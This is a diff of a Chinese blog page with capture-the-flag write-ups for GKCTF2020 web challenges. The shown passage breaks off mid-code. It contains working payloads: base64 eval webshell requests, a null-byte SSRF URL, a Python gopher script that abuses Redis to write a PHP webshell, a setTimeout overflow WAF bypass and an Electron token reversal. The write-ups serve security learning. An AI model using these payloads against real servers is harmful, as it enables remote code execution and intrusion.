@@ -416,33 +416,42 @@
 
 <h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h2><p><strong>代码执行</strong></p>
 <p>进去给到源码，给了我们一个小马</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php 
+highlight_file(__FILE__);
+class ClassName
+{
+        public $code = null;
+        public $decode = null;
+        function __construct()
+        {
+                $this-&gt;code = @$this-&gt;x()[&#39;Ginkgo&#39;];
+                $this-&gt;decode = @base64_decode( $this-&gt;code );
+                @Eval($this-&gt;decode);
+        }
 
+        public function x()
+        {
+                return $_REQUEST;
+        }
+}
+new ClassName();</code></pre>
 <p>先上一个小马</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> base64_encode(<span class="string">'eval($_REQUEST[kk]);'</span>);</span><br><span class="line">ZXZhbCgkX1JFUVVFU1Rba2tdKTs=</span><br></pre></td></tr></table></figure>
-
+<pre><code class="php">php &gt; echo base64_encode(&#39;eval($_REQUEST[kk]);&#39;);
+ZXZhbCgkX1JFUVVFU1Rba2tdKTs=</code></pre>
 <p>看看 phpinfo</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo=ZXZhbCgkX1JFUVVFU1Rba2tdKTs%3D&amp;kk=phpinfo();</span><br></pre></td></tr></table></figure>
-
-<p>绕 disable_functions</p>
+<pre><code>?Ginkgo=ZXZhbCgkX1JFUVVFU1Rba2tdKTs%3D&amp;kk=phpinfo();</code></pre><p>绕 disable_functions</p>
 <p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113759.png" alt="image-20200528103728833"></p>
 <p>蚁剑连上去，flag 需要 /readflag</p>
 <p>可以直接用这个绕  <a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p>
 <p>上传到 /tmp 目录，直接包含就好</p>
 <p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113803.png" alt></p>
 <p>执行命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo=ZXZhbCgkX1JFUVVFU1Rba2tdKTs%3D&amp;kk=include(&quot;/tmp/exploit.php&quot;);&amp;cmd=/readflag</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113808.png" alt="image-20200528105315601"></p>
+<pre><code>?Ginkgo=ZXZhbCgkX1JFUVVFU1Rba2tdKTs%3D&amp;kk=include(&quot;/tmp/exploit.php&quot;);&amp;cmd=/readflag</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113808.png" alt="image-20200528105315601"></p>
 <h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><p><strong>cve-2020-7066</strong></p>
 <p>exp 在这里 <a href="https://bugs.php.net/bug.php?id=79329" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=79329</a></p>
 <p>直接打就好，访问 127.0.0.1 返回 hint</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1%00.ctfhub.com</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164116.png" alt="image-20200528110116218"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.123%00.ctfhub.com</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164121.png" alt="image-20200528110131001"></p>
+<pre><code>?url=http://127.0.0.1%00.ctfhub.com</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164116.png" alt="image-20200528110116218"></p>
+<pre><code>?url=http://127.0.0.123%00.ctfhub.com</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164121.png" alt="image-20200528110131001"></p>
 <h2 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h2><p><strong>弱口令+后台geishell+提权</strong></p>
 <p>参考 <a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">http://www.nctry.com/1660.html</a> 后台getshell</p>
 <p>我这里扔了一个冰蝎的马，连上读 /flag</p>
@@ -470,47 +479,98 @@
 <p>给到了一个 hosts 的信息</p>
 <p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113906.png" alt="image-20200528113904509"></p>
 <p>尝试访问 localhost 被 waf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?url=http://127.0.0.1&amp;submit=提交</span><br></pre></td></tr></table></figure>
-
-<p>那就改成内网地址试试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?url=http://173.235.100.10&amp;submit=提交</span><br></pre></td></tr></table></figure>
-
-<p>返回了正常页面</p>
+<pre><code>/index.php?url=http://127.0.0.1&amp;submit=提交</code></pre><p>那就改成内网地址试试</p>
+<pre><code>/index.php?url=http://173.235.100.10&amp;submit=提交</code></pre><p>返回了正常页面</p>
 <p>这里我们揣测出题人的思路，那应该就是让我扫内网地址，直接 bp，发现了这个比较特殊</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?url=http://173.235.100.11&amp;submit=提交</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114349.png" alt="image-20200528114209680"></p>
+<pre><code>/index.php?url=http://173.235.100.11&amp;submit=提交</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114349.png" alt="image-20200528114209680"></p>
 <p>那就是让我们去扫描端口，继续 bp 扫常用端口，发现 redis 有回显</p>
 <blockquote>
 <p>记住要扫常用服务，不要从1开始扫，不然要很久</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?url=http://173.235.100.11:6379&amp;submit=提交</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114356.png" alt="image-20200528114347813"></p>
+<pre><code>/index.php?url=http://173.235.100.11:6379&amp;submit=提交</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114356.png" alt="image-20200528114347813"></p>
 <p>gopher 协议没有 ban，发现可以 redis 随意写 shell</p>
 <blockquote>
 <p>注意编码问题就好</p>
 </blockquote>
 <p>这里直接贴上 payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"></span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"173.19.221.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n\n\n&lt;?php system('ls / -al');system('cat /flag'); ?&gt;\n\n\n\n"</span></span><br><span class="line">filename=<span class="string">"index.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span>,</span><br><span class="line">     <span class="string">"quit"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += redis_format(x).replace(<span class="string">"\r\n"</span>,<span class="string">"%250D%250A"</span>).replace(<span class="string">"\n"</span>,<span class="string">"%250A"</span>).replace(<span class="string">"?"</span>,<span class="string">"%253f"</span>)</span><br><span class="line">    print(payload)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import urllib
+import requests as rq
 
+protocol=&quot;gopher://&quot;
+ip=&quot;173.19.221.11&quot;
+port=&quot;6379&quot;
+shell=&quot;\n\n\n\n&lt;?php system(&#39;ls / -al&#39;);system(&#39;cat /flag&#39;); ?&gt;\n\n\n\n&quot;
+filename=&quot;index.php&quot;
+path=&quot;/var/www/html&quot;
+passwd=&quot;&quot;
+cmd=[&quot;flushall&quot;,
+     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),
+     &quot;config set dir {}&quot;.format(path),
+     &quot;config set dbfilename {}&quot;.format(filename),
+     &quot;save&quot;,
+     &quot;quit&quot;
+     ]
+if passwd:
+    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
+payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
+def redis_format(arr):
+    CRLF=&quot;\r\n&quot;
+    redis_arr = arr.split(&quot; &quot;)
+    cmd=&quot;&quot;
+    cmd+=&quot;*&quot;+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
+    cmd+=CRLF
+    return cmd
+
+if __name__==&quot;__main__&quot;:
+    for x in cmd:
+        payload += redis_format(x).replace(&quot;\r\n&quot;,&quot;%250D%250A&quot;).replace(&quot;\n&quot;,&quot;%250A&quot;).replace(&quot;?&quot;,&quot;%253f&quot;)
+    print(payload)</code></pre>
 <blockquote>
 <p>这里我省了步骤，我是先看了 phpinfo()，发现没有 ban system()，再列一个目录，再看 flag 在哪</p>
 </blockquote>
 <p>上传之后回显成功</p>
 <p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114937.png" alt="image-20200528114934084"></p>
 <p>访问内网机子就能看到</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?url=http://173.235.100.11&amp;submit=提交</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528115043.png" alt="image-20200528115041491"></p>
+<pre><code>/index.php?url=http://173.235.100.11&amp;submit=提交</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528115043.png" alt="image-20200528115041491"></p>
 <h2 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h2><p><strong>nodejs</strong></p>
 <p>上来给了代码和版本，直接代码审计</p>
 <p>总体逻辑就是绕过这里的 waf</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">'/eval'</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'timeout'</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">'Timeout!'</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<pre><code class="js">app.use((req, res, next) =&gt; {
+  if (req.path === &#39;/eval&#39;) {
+    let delay = 60 * 1000;
+    console.log(delay);
+    if (Number.isInteger(parseInt(req.query.delay))) {
+      delay = Math.max(delay, parseInt(req.query.delay));
+    }
+    const t = setTimeout(() =&gt; next(), delay);
+    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
+    setTimeout(() =&gt; {
+      clearTimeout(t);
+      console.log(&#39;timeout&#39;);
+      try {
+        res.send(&#39;Timeout!&#39;);
+      } catch (e) {
 
+      }
+    }, 1000);
+  } else {
+    next();
+  }
+});</code></pre>
 <p>就可以直接 eval 了</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">'/eval'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">'Wrong Wrong Wrong!!!!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(<span class="built_in">String</span>(response));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
+<pre><code class="js">app.post(&#39;/eval&#39;, function (req, res) {
+  let response = &#39;&#39;;
+  if (req.body.e) {
+    try {
+      response = saferEval(req.body.e);
+    } catch (e) {
+      response = &#39;Wrong Wrong Wrong!!!!&#39;;
+    }
+  }
+  res.send(String(response));
+});</code></pre>
 <p>waf 可以用 int 溢出漏洞绕过，所以传入 2147483648 绕过成功</p>
 <blockquote>
 <p>当 delay 大于 2147483647 或小于 1 时,延迟将设置为 1</p>
@@ -533,36 +593,135 @@
 <blockquote>
 <p>命令行断点 bpu <a href="http://xxx.node3.buuoj.cn" target="_blank" rel="noopener">http://xxx.node3.buuoj.cn</a></p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:1,&quot;timestamp&quot;:1590639747000&#125;</span><br></pre></td></tr></table></figure>
-
-<p>直接修改 id = 3 会返回</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;HaHa Hacker!!!&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>写脚本伪造 timestamp 也失败</p>
+<pre><code>{&quot;id&quot;:1,&quot;timestamp&quot;:1590639747000}</code></pre><p>直接修改 id = 3 会返回</p>
+<pre><code>{&quot;message&quot;:&quot;HaHa Hacker!!!&quot;}</code></pre><p>写脚本伪造 timestamp 也失败</p>
 <p>所以后台应该是验证了 token</p>
 <p>还是去看看源码吧，把安装程序改成 zip 解压一下，源码在 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/app-64/resources/app.asar</span><br></pre></td></tr></table></figure>
-
-<p>进行反编译</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install -g asar</span><br><span class="line">asar extract app.asar app</span><br></pre></td></tr></table></figure>
-
-<p>看一下 buyflag 的逻辑</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">buyFlag: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> c()(a.a.mark((<span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> o;</span><br><span class="line">        <span class="keyword">return</span> a.a.wrap((<span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (;;) <span class="keyword">switch</span> (t.prev = t.next) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> o = &#123;</span><br><span class="line">                    id: e,</span><br><span class="line">                    timestamp: <span class="built_in">Date</span>.parse(<span class="keyword">new</span> <span class="built_in">Date</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                t.t0 = i.$http,</span><br><span class="line">                t.t1 = i.url + <span class="string">"/buyflag"</span>,</span><br><span class="line">                t.t2 = o,</span><br><span class="line">                t.next = <span class="number">6</span>,</span><br><span class="line">                i.makeToken(o);</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                t.t3 = t.sent,</span><br><span class="line">                t.t4 = &#123;</span><br><span class="line">                    token: t.t3</span><br><span class="line">                &#125;,</span><br><span class="line">                t.t5 = &#123;</span><br><span class="line">                    headers: t.t4</span><br><span class="line">                &#125;,</span><br><span class="line">                t.t6 = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                    i.$Modal.info(&#123;</span><br><span class="line">                        title: <span class="string">"购买结果"</span>,</span><br><span class="line">                        content: e.data[<span class="number">0</span>].flag</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;,</span><br><span class="line">                t.t0.post.call(t.t0, t.t1, t.t2, t.t5).then(t.t6);</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"end"</span>:</span><br><span class="line">                <span class="keyword">return</span> t.stop()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;), t, i)</span><br><span class="line">    &#125;)))()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code>/app-64/resources/app.asar</code></pre><p>进行反编译</p>
+<pre><code>npm install -g asar
+asar extract app.asar app</code></pre><p>看一下 buyflag 的逻辑</p>
+<pre><code class="js">buyFlag: function(e) {
+    var i = this;
+    return c()(a.a.mark((function t() {
+        var o;
+        return a.a.wrap((function(t) {
+            for (;;) switch (t.prev = t.next) {
+            case 0:
+                return o = {
+                    id: e,
+                    timestamp: Date.parse(new Date)
+                },
+                t.t0 = i.$http,
+                t.t1 = i.url + &quot;/buyflag&quot;,
+                t.t2 = o,
+                t.next = 6,
+                i.makeToken(o);
+            case 6:
+                t.t3 = t.sent,
+                t.t4 = {
+                    token: t.t3
+                },
+                t.t5 = {
+                    headers: t.t4
+                },
+                t.t6 = function(e) {
+                    i.$Modal.info({
+                        title: &quot;购买结果&quot;,
+                        content: e.data[0].flag
+                    })
+                },
+                t.t0.post.call(t.t0, t.t1, t.t2, t.t5).then(t.t6);
+            case 11:
+            case &quot;end&quot;:
+                return t.stop()
+            }
+        }), t, i)
+    })))()
+}</code></pre>
 <p>看一下 makeToken</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">makeToken: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> c()(a.a.mark((<span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> o, r;</span><br><span class="line">        <span class="keyword">return</span> a.a.wrap((<span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (;;) <span class="keyword">switch</span> (t.prev = t.next) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"31169fedc9a20ecf"</span>,</span><br><span class="line">                <span class="string">"d96adeefaa0102a9"</span>,</span><br><span class="line">                o = f()(n()(e)),</span><br><span class="line">                t.next = <span class="number">5</span>,</span><br><span class="line">                i.encrypt(<span class="string">"31169fedc9a20ecf"</span>, <span class="string">"d96adeefaa0102a9"</span>, o);</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">return</span> r = t.sent,</span><br><span class="line">                t.abrupt(<span class="string">"return"</span>, r);</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"end"</span>:</span><br><span class="line">                <span class="keyword">return</span> t.stop()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;), t, i)</span><br><span class="line">    &#125;)))()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="js">makeToken: function(e) {
+    var i = this;
+    return c()(a.a.mark((function t() {
+        var o, r;
+        return a.a.wrap((function(t) {
+            for (;;) switch (t.prev = t.next) {
+            case 0:
+                return &quot;31169fedc9a20ecf&quot;,
+                &quot;d96adeefaa0102a9&quot;,
+                o = f()(n()(e)),
+                t.next = 5,
+                i.encrypt(&quot;31169fedc9a20ecf&quot;, &quot;d96adeefaa0102a9&quot;, o);
+            case 5:
+                return r = t.sent,
+                t.abrupt(&quot;return&quot;, r);
+            case 7:
+            case &quot;end&quot;:
+                return t.stop()
+            }
+        }), t, i)
+    })))()
+}</code></pre>
 <p>再看一下 encrypt</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">encrypt: <span class="function"><span class="keyword">function</span>(<span class="params">e, i, t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> c()(a.a.mark((<span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a.a.wrap((<span 